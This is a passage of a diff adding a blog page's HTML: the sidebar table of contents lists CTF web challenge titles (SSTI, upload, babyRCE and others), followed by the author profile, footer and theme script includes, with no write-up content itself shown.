href="#%E5%85%A8%E7%90%83%E6%9C%80%E5%A4%A7%E4%BA%A4%E5%8F%8B%E7%BD%91%E7%AB%99"><span class="nav-number">1.7.3.</span> <span class="nav-text">全球最大交友网站</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%BF%E8%8D%89%E4%B9%8B%E6%9C%80%E5%BC%BA%E5%A4%A7%E8%84%91"><span class="nav-number">1.7.4.</span> <span class="nav-text">小绿草之最强大脑</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11"><span class="nav-number">1.8.</span> <span class="nav-text">11</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%91%86%E5%B0%B1%E5%AE%8C%E4%BA%8B%E4%BA%861"><span class="nav-number">1.8.1.</span> <span class="nav-text">摆就完事了1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flask-Plus"><span class="nav-number">1.8.2.</span> <span class="nav-text">Flask Plus</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1"><span class="nav-number">1.8.3.</span> <span class="nav-text">滴!晨跑打卡</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12"><span class="nav-number">1.9.</span> <span class="nav-text">12</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Easy-Audit"><span class="nav-number">1.9.1.</span> <span class="nav-text">Easy Audit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#calc"><span class="nav-number">1.9.2.</span> <span class="nav-text">*calc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%9F%EF%BC%9F%EF%BC%9F%EF%BC%9F"><span class="nav-number">1.9.3.</span> <span class="nav-text">？？？？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Simple-SSTI-1"><span class="nav-number">1.9.4.</span> <span class="nav-text">Simple_SSTI_1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#just-work-type"><span class="nav-number">1.9.5.</span> <span class="nav-text">just-work-type</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14"><span class="nav-number">1.10.</span> <span class="nav-text">14</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#simple-web-app"><span class="nav-number">1.10.1.</span> <span class="nav-text">simple web app</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cookies"><span class="nav-number">1.10.2.</span> <span class="nav-text">cookies</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#edr"><span class="nav-number">1.10.3.</span> <span class="nav-text">edr</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#intval"><span class="nav-number">1.10.4.</span> <span class="nav-text">intval</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wh1sper%E2%80%99s-secret-garden"><span class="nav-number">1.10.5.</span> <span class="nav-text">wh1sper’s_secret_garden</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#15"><span class="nav-number">1.11.</span> <span class="nav-text">15</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#switch"><span class="nav-number">1.11.1.</span> <span class="nav-text">switch</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17"><span class="nav-number">1.12.</span> <span class="nav-text">17</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bug1"><span class="nav-number">1.12.1.</span> <span class="nav-text">*bug1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bug2"><span class="nav-number">1.12.2.</span> <span class="nav-text">bug2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#command"><span class="nav-number">1.12.3.</span> <span class="nav-text">command</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#diao%E5%9B%BE%E7%AE%A1%E7%90%86%E5%99%A8%EF%BC%88%E5%B7%B2%E8%B7%91%E8%B7%AF"><span class="nav-number">1.12.4.</span> <span class="nav-text">*diao图管理器（已跑路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#upload"><span class="nav-number">1.12.5.</span> <span class="nav-text">upload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#18"><span class="nav-number">1.13.</span> <span class="nav-text">18</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#header"><span class="nav-number">1.13.1.</span> <span class="nav-text">header</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#search"><span class="nav-number">1.13.2.</span> <span class="nav-text">search</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssti"><span class="nav-number">1.13.3.</span> <span class="nav-text">ssti</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cookies-1"><span class="nav-number">1.13.4.</span> <span class="nav-text">cookies</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#19"><span class="nav-number">1.14.</span> <span class="nav-text">19</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Object"><span class="nav-number">1.14.1.</span> <span class="nav-text">*Object</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2048"><span class="nav-number">1.14.2.</span> <span class="nav-text">2048</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babyRCE"><span class="nav-number">1.14.3.</span> <span class="nav-text">babyRCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Do-you-know-HTTP"><span class="nav-number">1.14.4.</span> <span class="nav-text">Do you know HTTP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fake-galgame"><span class="nav-number">1.14.5.</span> <span class="nav-text">fake galgame</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#20"><span class="nav-number">1.15.</span> <span class="nav-text">20</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97-%E5%B0%8F%E9%A5%BC%E5%B9%B2"><span class="nav-number">1.15.1.</span> <span class="nav-text">Web安全入门指北-小饼干</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%B0%E7%8B%B1%E9%80%9A%E8%AE%AF"><span class="nav-number">1.15.2.</span> <span class="nav-text">地狱通讯</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%B0%E7%8B%B1%E9%80%9A%E8%AE%AF-%E6%94%B9"><span class="nav-number">1.15.3.</span> <span class="nav-text">地狱通讯-改</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezphp"><span class="nav-number">1.15.4.</span> <span class="nav-text">ezphp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap-boy"><span class="nav-number">1.15.5.</span> <span class="nav-text">*sqlmap_boy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#what-are-y0u-uploading%EF%BC%9F"><span class="nav-number">1.15.6.</span> <span class="nav-text">what are y0u uploading？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#God-of-Aim"><span class="nav-number">1.15.7.</span> <span class="nav-text">God_of_Aim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nextGen2"><span class="nav-number">1.15.8.</span> <span class="nav-text">nextGen2</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sean"
+      src="/images/banner.jpg">
+  <p class="site-author-name" itemprop="name">Sean</p>
+  <div class="site-description" itemprop="description">热爱可抵岁月漫长</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">90</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Seanxz401" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Seanxz401" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sean</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
